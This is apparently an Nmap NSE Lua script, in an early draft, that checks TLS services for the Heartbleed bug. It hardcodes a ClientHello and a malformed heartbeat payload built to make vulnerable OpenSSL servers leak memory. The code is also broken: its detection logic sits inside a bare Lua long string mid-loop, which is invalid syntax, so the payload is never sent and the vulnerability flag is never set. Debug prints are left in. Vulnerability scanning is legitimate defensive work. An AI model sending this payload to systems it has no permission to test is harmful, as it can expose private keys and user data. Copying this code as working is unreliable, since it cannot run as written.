description = [[
    Check if a service is vulnerable to Heartbleed 
    (http://heartbleed.com)

    ClientHello mercilessly stolen from Martin Bosslet: 
    https://github.com/emboss/heartbeat
]]

author      = "Aaron Zauner <azet@azet.org>"
license     = "MIT"
categories  = { "default", "discovery", "intrusive", "vuln" }

local         nmap = require "nmap"
local          bin = require "bin"
local        match = require "match"
local    shortport = require "shortport"
local       stdnse = require "stdnse"

---- a TLS ClientHello contains:
-- ProtocolVersion, Random, SessionID
-- CipherSuite, CompressionMethod and 
-- optional Extensions
local client_hello = bin.pack("H", [[
    16 03 01 00 38 01 00 00 34 03
    01 23 18 50 c0 c7 9d 32 9f 90
    63 de 32 12 14 1f 8c eb f1 a4
    45 2b fd cc 12 87 ca db 32 b5
    96 86 16 00 00 06 00 0a 00 2f
    00 35 01 00 00 05 00 0f 00 01
    01
]])
---- TLS Heartbeat extension type:
local    heartbeat = bin.pack("H", "18")
---- TLS ALERT type:
local        alert = bin.pack("H", "15")
---- TLS ServerHello done:
local         done = bin.pack("H", [[
    0e 00 00 00
]])
---- Heartbeat payload:
local      payload = bin.pack("H", [[
    18 03 02 00 03 01 40 00
]])
---- a TLS record looks like this:
--   1 Byte   1 Byte   1 Byte   1 Byte
-- +--------+--------+--------+--------+
-- |  type  |                          |
-- +--------+--------+-----------------+ 
-- |     version     |      length     |
-- +-----------------+-----------------+
-- |             message N             |
-- +-----------------------------------+
-- |                 .                 |
--                   .                 
--                   .
local     r_header = function(socket)
    -- TLS record header
    local   t,    v,       l,
            type, version, length

    t, type    = socket:receive_buf(match.numbytes(1), true)
    v, version = socket:receive_buf(match.numbytes(2), true)
    l, length  = socket:receive_buf(match.numbytes(2), true)

    if not t or not v or not l then return end
    return true, type, version, length
end
local    r_message = function(socket, length)
    -- TLS record message
    local d, data = socket:receive_buf(match.numbytes(length), true)
    if not d then return end
    return data
end
local   message_len = function(len)
    -- convert TLS length field to big endian ushort, return number
    local position, length = bin.unpack(">S", len)
    return tonumber(length)
end


portrule = shortport.ssl
action   = function(host, port)
    local   status  = true
    local   error   = false
    local   vuln,
            type, version, length, data

    -- create socket
    socket = nmap.new_socket()
    socket:set_timeout(2000)
    status, error = socket:connect(host, port, "tcp")
    if status then
        stdnse.print_debug("Connected.")
    end

    -- send TLS ClientHello
    status, error = socket:send(client_hello)
    if status then
        stdnse.print_debug("Sent TLS ClientHello.")
    end

    repeat
        status, type, version, length = r_header(socket)
        if not status then
            break
        end
        if message_len(length) > 0 then
            data = r_message(socket, message_len(length))
        end

        print "\n--------------\ntype"
        print(bin.unpack("H", type))
        print "version"
        print(bin.unpack("HH", version))
        print "len"
        print (message_len(length))
        print "data"
        print(bin.unpack("HHHHHHHHHHHHHHHHHHHHHHHH", data))
        print "--------------"

[[
        if data == done then
            stdnse.print_debug("ServerHello done.")
            status, error = socket:send(payload)
            if not status then
                break
            else
                stdnse.print_debug("Sent Payload.")
            end
        elseif type == heartbeat and string.len(data) > 3 then
            stdnse.print_debug("Got Heartbeat TLS type and data!")
            vuln = true
        elseif type == heartbeat and string.len(data) < 3 then
            stdnse.print_debug("Got Heartbeat TLS type and but no data.")
            vuln = false
        --elseif type == alert then
        --    stdnse.print_debug("Got TLS ALERT, this is OK", nil)
        --    vuln = false
        end
]]
    until vuln ~= nil

    socket:close()

    local txt = "VULNERABLE to the heartbleed bug."
    if not status then
        return stdnse.format_output(status, error)
    elseif vuln then
        return stdnse.format_output(status, txt)
    else
        return stdnse.format_output(status, "NOT " .. txt)
    end
end
